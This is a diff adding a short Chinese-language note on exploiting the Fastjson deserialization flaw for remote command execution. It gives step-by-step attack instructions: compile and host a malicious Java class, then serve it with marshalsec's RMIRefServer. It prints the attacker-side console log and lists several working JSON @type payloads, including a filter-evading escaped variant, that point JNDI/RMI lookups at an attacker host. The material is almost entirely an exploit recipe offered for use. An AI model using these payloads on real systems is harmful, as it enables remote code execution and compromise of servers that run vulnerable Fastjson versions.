@@ -1,0 +1,35 @@
+Fastjson漏洞可以命令执行
+
+攻击流程：
+1.找一台装有java的机器，运行	javac ExportObject.java会得到ExportObject.class
+2.将ExportObject.class放到外网http服务器上，比如。http://你的服务器ip/ExportObject.class
+3.在外网服务器上运行java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://你的服务器ip/#ExportObject 10086 表示该http下的class转换成rmi服务
+4.在目标站点运行 
+
+攻击方：
+root@test:~/tools/rmi# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://183.2.xxx.xxx/#Exploit 10086
+
+* Opening JRMP listener on 10086
+
+Have connection from /121.xxx.xxx.xxx:55837
+
+Reading message...
+
+Is RMI.lookup call for Exploit 2
+
+Sending remote classloading stub targeting http://183.2.xxx.xxx/Exploit.class
+
+Closing connection
+
+
+
+1. 老的
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://恶意主机:端口/Object","autoCommit":true}
+{\"@type\":\"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://xxx.24.xxx.xxx:80/Object\",\"autoCommit\":true}
+
+{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://183.2.xxx.xxx:10086/Exploit","autoCommit":true},age:12}
+
+2. 包括1.2.45的
+
+{"name":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://xxx.2.xxx.xxx:10086/Exploit"},"autoCommit":true},age:12}
+
